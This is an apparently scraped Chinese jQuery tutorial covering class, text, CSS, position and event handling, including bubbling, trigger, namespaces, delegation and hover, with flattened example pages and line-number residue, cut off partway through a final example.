&lt;title&gt;19-jQuery类操作相关方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 1.addClass(class|fn) // 作用：添加一个类，如果要添加多个，中间用空格隔开 // 2.removeClass([class|fn]) // 作用：删除一个类，如果要删除多个，中间用空格隔开 // 3.toggleClass(class|fn[,sw]) // 作用：切换，有就删除，没有就添加 var btns = document.getElementsByTagName('button'); btns[0].onclick = function () &#123; $('div').addClass('class1 class2'); &#125;; btns[1].onclick = function () &#123; $('div').removeClass('class1 class2'); &#125;; btns[2].onclick = function () &#123; $('div').toggleClass('class1 class2'); &#125;; &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .class1 &#123; width: 100px; height: 100px; background: red; &#125; .class2 &#123; border: 10px solid yellowgreen; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;添加类&lt;/button&gt;&lt;button&gt;删除类&lt;/button&gt;&lt;button&gt;切换类&lt;/button&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;4. jQuery代码/文本/值html([val|fn])添加或获取元素中的HTMLtext([val|fn])添加或获取元素中的文本text方法能做的html方法都能做,所以一般使用html方法即可val([val|fn|arr])添加或获取元素value属性的值1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;20-jQuery文本值相关操作&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 1.html([val|fn]) // 和原生JS中的innerHTML一模一样 // 2.text([val|fn]) // 和原生JS中的innerTEXT一模一样 // 3.val([val|fn|arr]) $(function () &#123; var btns = document.getElementsByTagName('button'); btns[0].onclick = function () &#123; $('div').html('&lt;p&gt;我是段落&lt;span&gt;我是span&lt;/span&gt;&lt;/p&gt;'); &#125;; btns[1].onclick = function () &#123; console.log($('div').html()); &#125;; btns[2].onclick = function () &#123; $('div').text('&lt;p&gt;我是段落&lt;span&gt;我是span&lt;/span&gt;&lt;/p&gt;'); &#125;; btns[3].onclick = function () &#123; console.log($('div').text()); &#125;; btns[4].onclick = function () &#123; $('input').val('请输入内容'); &#125;; btns[5].onclick = function () &#123; console.log($('input').val()); &#125;; &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; div &#123; width: 100px; height: 100px; border: 1px solid; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;设置html&lt;/button&gt;&lt;button&gt;获取html&lt;/button&gt;&lt;button&gt;设置text&lt;/button&gt;&lt;button&gt;获取text&lt;/button&gt;&lt;button&gt;设置value&lt;/button&gt;&lt;button&gt;获取value&lt;/button&gt;&lt;div&gt;&lt;/div&gt;&lt;br/&gt;&lt;input type="text"&gt;&lt;/body&gt;&lt;/html&gt;六、CSS操作1. jQuery操作CSS样式css(name|pro|[,val|fn])方法用于设置或获取元素CSS样式格式1：DOM元素.css(“样式名称”, “值”);格式2：DOM元素.css({“样式名称1”:”值1”,”样式名称2”:”值2”});12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;21-jQuery操作样式方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 1.逐个设置 $('div').css('width', '100px'); $('div').css('height', '100px'); $('div').css('background', 'yellow'); // 2.链式设置 // 注意点：链式操作如果大于三步，建议分开 $('div').css('width', '100px').css('height', '100px').css('background', 'red'); // 3.批量设置 $('div').css(&#123; width: '100px', height: '100px', background: 'green' &#125;); // 4.获取 console.log($('div').css('width')); console.log($('div').css('height')); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;2. jQuery操作元素尺寸width([val|fn])方法设置或获取元素宽度(相当于获取width属性值)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;11-jQuery操作位置和尺寸&lt;/title&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; .father&#123; width: 250px; height: 250px; background-color: red; margin-left: 50px; position: relative; &#125; .son&#123; width: 100px; height: 100px; background-color: blue; position: absolute; left: 50px; top: 50px; &#125; &lt;/style&gt; &lt;script src="代码/js/jquery-1.12.4.js"&gt;&lt;/script&gt; &lt;script&gt; $(function () &#123; $("button").eq(0).click(function () &#123; // 1.获取元素宽度(不包括padding和border)// alert($('.son').width()); &#125;); $("button").eq(1).click(function () &#123; // 2.设置元素宽度(不包括padding和border)// $(".son").width("50px"); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="father"&gt; &lt;div class="son"&gt;&lt;/div&gt;&lt;/div&gt;&lt;button&gt;获取&lt;/button&gt;&lt;button&gt;设置&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;height([val|fn])方法设置或获取元素宽度(相当于获取height属性值)用上面按钮代码自己写,工作后都得靠自己,多锻炼自学能力(如何查看文档,如何编写测试案例等)innerHeight()/innerWidth()用上面按钮代码自己写,工作后都得靠自己,多锻炼自学能力(如何查看文档,如何编写测试案例等)outerHeight/outerWidth()用上面按钮代码自己写,工作后都得靠自己,多锻炼自学能力(如何查看文档,如何编写测试案例等)3. jQuery操作元素位置offset([coordinates])获取或设置元素相对窗口的偏移位position()获取相对于它最近的具有相对位置(position:relative或position:absolute)的父级元素的距离12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;22-jQuery尺寸和位置操作&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .father &#123; width: 200px; height: 200px; background: yellowgreen; border: 50px solid #000000; margin-left: 50px; position: relative; &#125; .son &#123; width: 100px; height: 100px; background: gold; position: absolute; top: 50px; left: 50px; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var btns = document.getElementsByTagName('button'); // 监听获取 btns[0].onclick = function () &#123; // 获取元素的宽度 // console.log($('.father').width()); &#125;; // 监听设置 btns[1].onclick = function () &#123; // 设置元素的宽度 // $('.father').width('500px'); // $('.son').offset(&#123; // left:10 // &#125;) &#125;; // offset([coordinates]) // 作用：获取元素距离窗口的偏移位 // console.log($('.son').offset().left); // position() // 作用：获取元素距离定位元素的偏移位,只能获取，不能设置 // $('.son').position(&#123; // left:20 // &#125;) console.log($('.son').position().left); $('.son').css(&#123; left:20, &#125;) &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="father"&gt; &lt;div class="son"&gt; &lt;/div&gt;&lt;/div&gt;&lt;button&gt;获取&lt;/button&gt;&lt;button&gt;设置&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;scrollTop([val])设置或获取匹配元素相对滚动条顶部的偏移。scrollLeft([val])用上面按钮代码自己写,工作后都得靠自己,多锻炼自学能力(如何查看文档,如何编写测试案例等)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;23-jQuery的scrollTop方法&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .scroll &#123; width: 100px; height: 100px; border: 1px solid black; overflow: auto; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var btns = document.getElementsByTagName('button'); btns[0].onclick = function () &#123; // 获取滚动的偏移位 console.log($('.scroll').scrollTop()); // 获取网页滚动的偏移位 // 注意点：为了保证浏览器的兼容，需要按照以下写法 console.log($('html').scrollTop() + $('body').scrollTop()); &#125;; btns[1].onclick = function () &#123; // 设置滚动的偏移位 $('.scroll').scrollTop(10); // 设置网页的滚动偏移位 // 注意点：为了保证浏览器的兼容，设置网页滚动偏移位的时候需要按照以下写法 $('html,body').scrollTop(20) &#125;; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="scroll"&gt; 我是div 我是div 我是div 我是div 我是div 我是div 我是div 我是div&lt;/div&gt;&lt;button&gt;获取&lt;/button&gt;&lt;button&gt;设置&lt;/button&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;七、事件处理1. 事件绑定jQuery中事件绑定有两种方式eventName(function(){})绑定对应事件名的监听, 例如：$(‘#div’).click(function(){});on(eventName, funcion(){})通用的绑定事件监听, 例如：$(‘#div’).on(‘click’, function(){});优缺点:eventName: 编码方便, 但有的事件监听不支持on: 编码不方便, 但更通用企业开发中如何选择?能用eventName就用eventName, 不能用eventName就用on示例:1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;24-jQuery事件绑定&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // jQuery中有两种绑定事件方式 // 1.eventName(fn); // 编码效率略高,部分事件jQuery没有实现，所有不能添加 $('button').click(function () &#123; alert('hello'); &#125;); // 2.on(eventName,fn); // 编码效率略低，所有js事件都可以添加 $('button').on('click', function () &#123; alert('hello click'); &#125;) // 注意点: // 可以多次添加相同或不同类型的事件不,且会覆盖 &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;我是按钮&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;2. 事件解绑jQuery中可以通过off(eventName,function);解绑事件示例:123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;25-jQuery事件解绑&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; function test1() &#123; alert('test1'); &#125; function test2() &#123; alert('test2'); &#125; $('button').click(test1); $('button').click(test2); $('button').mouseleave(function () &#123; alert('mouseleave'); &#125;); $('button').mouseenter(function () &#123; alert('mouseenter'); &#125;); // off方法如果不传递参数，会移除所有的事件 // $('button').off(); // off方法如果传递一个参数，会移除所有指定类型的事件 // $('button').off('click'); // off方法如果传递两个参数，会移除所有指定类型的指定事件 // $('button').off('click，test1'); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;我是按钮&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;3. 获取事件的坐标当事件被触发时,系统会将事件对象(event)传递给回调函数,通过event对象我们就能获取时间的坐标获取事件坐标有三种方式event.offsetX, event.offsetY 相对于事件元素左上角event.pageX, event.pageY 相对于页面的左上角event.clientX, event.clientY 相对于视口的左上角event.page和event.client区别网页是可以滚动的,而视口是固定的所以想获取距离可视区域坐标通过event.client想获取距离网页左上角的坐标通过event.client示例代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;13-jQuery事件绑定和解绑&lt;/title&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; .father&#123; width: 200px; height: 200px; background: red; overflow: hidden; &#125; .son&#123; width: 100px; height: 100px; background: blue; margin-top: 50px; margin-left: 50px; &#125; &lt;/style&gt; &lt;script src=&quot;../day01/代码/js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(function () &#123; // 获取事件的坐标 $(&quot;.son&quot;).click(function (event) &#123; // 获取相对于事件元素左上角坐标 console.log(event.offsetX, event.offsetY); // 获取相对于视口左上角坐标 console.log(event.clientX, event.clientY); // 获取相对于页面左上角坐标 console.log(event.pageX, event.pageY); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;father&quot;&gt; &lt;div class=&quot;son&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/body&gt;&lt;/html&gt;4. 阻止事件冒泡什么是事件冒泡?事件冒泡是从目标元素逐级向上传播到根节点的过程小明告诉爸爸他有一个女票,爸爸告诉爷爷孙子有一个女票,一级级向上传递就是事件冒泡如何阻止事件冒泡?多数情况下，我们希望在触发一个元素的事件处理程序时，不影响它的父元素, 此时便可以使用停止事件冒泡12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;26-jQuery事件冒泡和默认行为&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .father &#123; width: 200px; height: 200px; background: yellowgreen; &#125; .son &#123; width: 100px; height: 100px; background: gold; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 1.什么是事件冒泡 // 2.如何阻止事件冒泡 // 第一种是使用return false; // 第二种是调用event.stopPropagation(); $('.son').click(function (event) &#123; alert('son'); // return false; event.stopPropagation(); &#125;); $('.father').click(function () &#123; alert('father'); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="father"&gt; &lt;div class="son"&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;5. 阻止事件默认行为什么是默认行为?网页中的元素有自己的默认行为,例如单击超链接后会跳转,点击提交表单按钮会提交如何阻止事件默认行为?可以使用event.preventDefault();方法阻止事件默认行为方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;26-jQuery事件冒泡和默认行为&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .father &#123; width: 200px; height: 200px; background: yellowgreen; &#125; .son &#123; width: 100px; height: 100px; background: gold; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 1.什么是默认行为 // 2.如何阻止默认行为 // 第一种是使用return false; // 第二种是调用event.stopPropagation(); $('a').click(function (event) &#123; alert('弹出注册框'); // return false; event.stopPropagation(); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="http://www.baidu.com"&gt;我是百度&lt;/a&gt;&lt;form action="http://www.taobao.com"&gt; &lt;input type="text"&gt; &lt;input type="submit"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;6. 自动触发事件什么是自动触发事件通过代码控制事件, 不用人为点击/移入/移除等事件就能被触发自动触发事件方式$(“selector”).trigger(“eventName”);触发事件的同时会触发事件冒泡触发事件的同时会触发事件默认行为$(“selector”).triggerHandler(“eventName”);触发事件的同时不会触发事件冒泡触发事件的同时不会触发事件默认行为12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;27-jQuery事件自动触发&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .father &#123; width: 200px; height: 200px; background: yellowgreen; &#125; .son &#123; width: 100px; height: 100px; background: gold; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('.son').click(function () &#123; alert('son'); &#125;); $('.father').click(function () &#123; alert('father'); &#125;); /* * trigger:如果利用trigger自动触发事件，会触发事件冒泡 * triggerHandler：如果利用trigger自动触发事件，不会触发事件冒泡 */ // $('.father').trigger('click'); // $('.son').trigger('click'); // $('.father').triggerHandler('click'); // $('.son').triggerHandler('click'); /* * trigger:如果利用trigger自动触发事件，会触发默认行为 * triggerHandler：如果利用trigger自动触发事件，不会触发默认行为 */ // $("input[type='submit']").click(function () &#123; // alert('submit'); // &#125;); // $("input[type='submit']").trigger('click'); // $("input[type='submit']").triggerHandler('click'); $('a').click(function () &#123; alert('a'); &#125;); // 注意点：trigger和triggerHandler针对a标签的操作一样，不会触发默认行为 // $('a').trigger('click'); // $('a').triggerHandler('click'); // 但是若想a标签自动触发，且有默认行为,需要针对a标签里的span元素进行操作 $('span').trigger('click'); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="father"&gt; &lt;div class="son"&gt; &lt;/div&gt;&lt;/div&gt;&lt;a href="http://www.baidu.com"&gt;我是百度&lt;/a&gt;&lt;a href="http://www.baidu.com"&gt;&lt;span&gt;我是有默认行为的&lt;/span&gt;&lt;/a&gt;&lt;form action="http://www.taobao.com"&gt; &lt;input type="text"&gt; &lt;input type="submit"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;7. 事件命名空间和自定义事件什么是自定义事件自定义事件就是自己虾XX起一个不存在的事件名称来注册事件, 然后通过这个名称还能触发对应的方法执行, 这就是传说中的自定义事件自定义事件的前提条件1.事件必须是通过on绑定的2.事件必须通过trigger来触发因为trigger方法可以自动触发对应名称的事件,所以只要事件的名称和传递给trigger的名称一致就能执行对应的事件方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;28-jQuery自定义事件&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .father &#123; width: 200px; height: 200px; background: yellowgreen; &#125; .son &#123; width: 100px; height: 100px; background: gold; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* * 自定义事件需要满足两个条件 * 1.事件必须是通过on绑定 * 2.事件必须通过trigger来触发 * * */ // $('.son').myClick(function () &#123; // alert('son'); // &#125;); // $('.son').trigger('myClick'); $('.son').on('myClick', function () &#123; alert('son'); &#125;); $('.son').trigger('myClick'); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="father"&gt; &lt;div class="son"&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;什么是事件命名空间众所周知一个元素可以绑定多个相同类型的事件.企业多人协同开发中,如果多人同时给某一个元素绑定了相同类型的事件,但是事件处理的方式不同,就可能引发事件混乱为了解决这个问题jQuery提出了事件命名空间的概念事件命名空间主要用于区分相同类型的事件,区分不同前提条件下到底应该触发哪个人编写的事件格式: “eventName.命名空间”添加事件命名空间的前提条件1.事件是通过on来绑定的2.通过trigger触发事件注意点(面试题!!!面试题!!!面试题!!!):不带命名空间事件被trigger调用,会触发带命名空间事件带命名空间事件被trigger调用,只会触发带命名空间事件下级不带命名空间事件被trigger调用,会冒泡触发上级不带命名空间和带命名空间事件下级带命名空间事件被trigger调用,不会触发上级不带命名空间事件下级带命名空间事件被trigger调用,会触发上级带命名空间事件示例:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;29-jQuery事件命名空间&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .father &#123; width: 200px; height: 200px; background: yellowgreen; &#125; .son &#123; width: 100px; height: 100px; background: gold; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* * 想要事件的命名空间有效，必须满足两个条件 * 1.事件是通过on绑定的 * 2.通过trigger触发事件 * */ $('.son').on('click.zs', function () &#123; alert('click-1'); // 自动弹出 &#125;); $('.son').on('click.ls', function () &#123; alert('click-2'); &#125;); $('.son').trigger('click.zs'); // $('.son').trigger('click.ls'); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="father"&gt; &lt;div class="son"&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;30-jQuery事件命名空间面试题&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .father &#123; width: 200px; height: 200px; background: yellowgreen; &#125; .son &#123; width: 100px; height: 100px; background: gold; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('.father').on('click.zs', function () &#123; alert('father click-1'); &#125;); $('.father').on('click', function () &#123; alert('father click-2'); &#125;); $('.son').on('click.zs', function () &#123; alert('son click-1'); &#125;); // 1.利用trigger触发子元素带有命令空间的事件，那么父元素带相同命名空间的事件也会被触发，而父元素没有命令空间的不会被触发 // $('.son').trigger('click.zs'); // 2.利用trigger触发子元素不带命令空间的事件，那么子元素所有相同类型的事件和父元素所有相同的事件都会被触发 $('.son').trigger('click'); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="father"&gt; &lt;div class="son"&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;8.事件委托什么是事件委托例如: 张三在寝室不想去食堂吃饭,那么张三可以”委托”李四帮忙带一份饭例如: 张三先找房,但是对要找房的地点又不熟悉,那么张三可以”委托”中介帮忙找房所以得出结论:事件委托就是请其他人帮忙做我们想做的事做完之后最终的结果还是会反馈到我们这里js中事件委托的好处减少监听数量添加到页面上的事件处理程序数量将直接关系到页面的整体运行性能，因为需要不断的与dom节点进行交互，访问dom的次数越多，引起浏览器重绘与重排的次数也就越多，就会延长整个页面的交互就绪时间每个监听的函数都是一个对象，是对象就会占用内存，对象越多，内存占用率就越大，自然性能就越差… …新增元素自动有事件响应处理默认情况下新增的元素无法响应新增前添加的事件jQuery中如何添加事件委托添加前$(“li”).click隐式迭代给界面上所有li都添加了click事件(监听数量众多)通过$(“ul”).append新添加的li无法影响click事件添加后格式:$(parentSelector).delegate(childrenSelector, eventName, callback)$(“ul”).delegate隐式迭代所有ul添加事件(相比开始迭代li,必然ul的个数会少很多)当事件被触发时,系统会自动动态查找当前是哪个li触发了事件,所以新增的li也能响应到事件1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;31-jQuery事件委托&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* * 1.什么是事件委托 * 请别人帮忙做事情，然后将做完的结果反馈给我们 * */ $('button').click(function () &#123; $('ul').append('&lt;li&gt;我是新增的li&lt;/li&gt;'); &#125;); // 在jQuery中如果通过核心函数找到的元素不止一个，那么在添加事件的时候jQuery会遍历所有找到的元素，给所有找到的元素添加事件 // $('ul&gt;li').click(function () &#123; // console.log($(this).html()); // &#125;); $('ul').delegate('li','click',function () &#123; console.log($(this).html()); &#125;) &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;ul&gt; &lt;li&gt;我是第1个li&lt;/li&gt; &lt;li&gt;我是第2个li&lt;/li&gt; &lt;li&gt;我是第3个li&lt;/li&gt;&lt;/ul&gt;&lt;button&gt;新增1个li&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;事件委托练习点击登录按钮，出现一个登录界面(其实是个图片),登录界面右上角使用span标签定义了关闭(移除)操作，同时阻止了默认行为12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;32-jQuery事件委托练习&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; html, body &#123; width: 100%; height: 100%; &#125; .mask &#123; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); position: fixed; top: 0; left: 0; &#125; .login &#123; width: 522px; height: 290px; margin: 100px auto; position: relative; &#125; .login &gt; span &#123; width: 50px; height: 50px; /*background: red;*/ /*显示出关闭按钮的位置*/ position: absolute; top: 0; right: 0; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('a').click(function () &#123; var $mask = $("&lt;div class=\"mask\"&gt;\n" + " &lt;div class=\"login\"&gt;\n" + " &lt;img src=\"images/login.jpg\" alt=\"\"&gt;\n" + " &lt;span&gt;&lt;/span&gt;\n" + " &lt;/div&gt;\n" + "&lt;/div&gt;"); $('body').append($mask); $('body').delegate('.login&gt;span', 'click', function () &#123; $mask.remove(); &#125;); return false; &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="http://www.baidu.com"&gt;点击登录&lt;/a&gt;&lt;div&gt; 我是段落 我是段落 我是段落 我是段落 我是段落 我是段落 我是段落 我是段落 我是段落 我是段落&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;9.移入移出事件mouseenter和mouseleave移动到子元素不会触发事件mouseover和mouseout移动到子元素会触发事件hover内容监听移入和移出内部实现就是调用mouseenter和mouseleave1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;33-jQuery移入移出事件&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .father &#123; width: 200px; height: 200px; background: yellowgreen; &#125; .son &#123; width: 100px; height: 100px; background: gold; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* * mouseover/mouseout事件，子元素被移入移出也会触发父元素的事件 * */ // $(".father").mouseover(function () &#123; // console.log('father被移入了！') // &#125;); // $(".father").mouseout(function () &#123; // console.log('father被移出了！') // &#125;); /* * mouseenter/mouseleave事件，子元素被移入移出不会触发父元素的事件 * 推荐大家使用 * */ // $(".father").mouseenter(function () &#123; // console.log('father被移入了！') // &#125;); // $(".father").mouseleave(function () &#123; // console.log('father被移出了！') // &#125;); /* * hover事件，第一个函数是监听移入事件，第二个函数是监听移出事件，子元素被移入移出不会触发父元素的事件 * */ // $(".father").hover(function () &#123; // console.log('father被移入了！') // &#125;, function () &#123; // console.log('father被移出了！') // &#125;); /* * hover事件只用一个函数，监听移入和移出事件，子元素被移入移出不会触发父元素的事件 * */ $(".father").hover(function () &#123; console.log('father被移入移出了！'); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="father"&gt; &lt;div class="son"&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;10. 移入移出练习电影排行榜：鼠标移动到哪一行,哪一行展开效果123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;35-电影排行榜下&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .box &#123; width: 300px; height: 450px; margin: 50px auto; border: 1px solid black; &#125; .box h1 &#123; font-size: 20px; line-height: 35px; color: deeppink; padding-left: 10px; border-bottom: 1px dashed #cccccc; &#125; ul li &#123; list-style: none; padding: 5px 10px; border: 